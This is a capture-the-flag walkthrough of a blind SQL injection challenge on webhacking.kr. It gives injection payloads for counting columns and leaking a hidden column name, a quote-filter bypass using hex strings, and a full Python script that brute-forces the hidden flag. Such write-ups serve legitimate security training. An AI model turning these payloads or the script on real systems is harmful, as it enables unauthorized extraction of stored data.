# Old 55    SQLi (Blind)

URL: 
- App: [https://webhacking.kr/challenge/web-31/](https://webhacking.kr/challenge/web-31/)
- Rankings: [https://webhacking.kr/challenge/web-31/rank.php](https://webhacking.kr/challenge/web-31/rank.php)

As soon as we visit the website and move mouse around the slime starts moving around, as we move around we get points and next 2 numbers seem to be (x, y) coordinates.

![old-55.png](/assets/ctf/webhacking.kr/old-55.png)

Rankings:

![old-55-1.png](/assets/ctf/webhacking.kr/old-55-1.png)

Whenever we finish playing with slime our score is inserted into the database.
```php
mysqli_query(
	$db,
	"insert into chall55 values('{$_SESSION['id']}','" . trim($_POST['score']) . "','{$flag}')"
);
```

Ranking also has a search function with `GET` method:
```bash
https://webhacking.kr/challenge/web-31/rank.php?score=<player_score>
```

```sql
1' OR 1=1 -- -                                                                 #' Payload
https://webhacking.kr/challenge/web-31/rank.php?score=1%27%20OR%201=1%20--%20- => Result = no hack
```

```sql
Payload: 1 OR 1=1 -- -
URL    : https://webhacking.kr/challenge/web-31/rank.php?score=1%20OR%201=1%20--%20-
Result : id : jisu8110 // 895

Payload: 1 OR 1=0 -- -
URL    : https://webhacking.kr/challenge/web-31/rank.php?score=1%20OR%201=0%20--%20-
Result : id : Piterpan // 1
```

The search seems to be returning 2 columns, username and score itself.
```sql
Payload: 1 ORDER BY 3
URL    : https://webhacking.kr/challenge/web-31/rank.php?score=1+ORDER+BY+3
Result : id : terran // 1

Payload: 1 ORDER BY 4
URL    : https://webhacking.kr/challenge/web-31/rank.php?score=1+ORDER+BY+4
Result : id : //
```

Looks like there's a hidden or unused column in query.

Using `PROCEDURE ANALYSE` trick leak the column names:
```sql
Payload: 1 LIMIT 0,1 PROCEDURE ANALYSE()
URL    : https://webhacking.kr/challenge/web-31/rank.php?score=1%20LIMIT%200,1%20PROCEDURE%20ANALYSE()
Result : id : webhacking.chall55.id //

Payload: 1 LIMIT 1,1 PROCEDURE ANALYSE()
URL    : https://webhacking.kr/challenge/web-31/rank.php?score=1%20LIMIT%201,1%20PROCEDURE%20ANALYSE()
Result : id : webhacking.chall55.score //

Payload: 1 LIMIT 2,1 PROCEDURE ANALYSE()
URL    : https://webhacking.kr/challenge/web-31/rank.php?score=1%20LIMIT%202,1%20PROCEDURE%20ANALYSE()
Result : id : webhacking.chall55.p4ssw0rd_1123581321 //
```

We have access to `LIKE` operator, but it's case insensitive so probably `SUBSTRING` is more useful, but it's blocked.

Didn't seem to work, probably MySQL version is too old..
```sql
1 AND p4ssw0rd_1123581321 COLLATE utf8mb4_bin LIKE 0x61646d696e
```

We can use `LEFT` or `RIGHT` functions like substring. Brute the flag:
```python
import string
import aiohttp
import asyncio

URL = 'https://webhacking.kr/challenge/web-31/rank.php'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f'}
#                LEFT(column, length)=guess [len(guess)=length]
PAYLOAD = "1 AND LEFT(p4ssw0rd_1123581321,{})={}"
CHARSET = string.ascii_letters + string.digits + '{}!?,_'
SUCCESS = 'Piterpan'

async def fetch(session, payload):
    async with session.get(URL, params={'score': payload}, cookies=COOKIES) as resp:
        text = await resp.text()
        if SUCCESS in text:
            return True
        else:
            return False

async def main():
    connector = aiohttp.TCPConnector(ssl=False, limit=32)
    async with aiohttp.ClientSession(connector=connector) as session:
        flag = "FLAG{"
        while True:
            print(flag)
            flag_i = len(flag) + 1
            tasks = [
                fetch(session, PAYLOAD.format(flag_i, '0x' + ''.join(format(ord(c), '0X') for c in flag+char)))
                for char in CHARSET
            ]
            results = await asyncio.gather(*tasks)
            for i, result in enumerate(results):
                if result:
                    flag += CHARSET[i]
                    break
            else:
                break

if __name__ == '__main__':
    asyncio.run(main())
```

::: info Note
Quotes are not allowed so I used hex strings to bypass that.
:::

```powershell
➜ py .\old-55.py
FLAG{
FLAG{e
...
FLAG{easy_peasy_lemon_squeezy!
FLAG{easy_peasy_lemon_squeezy!}
```

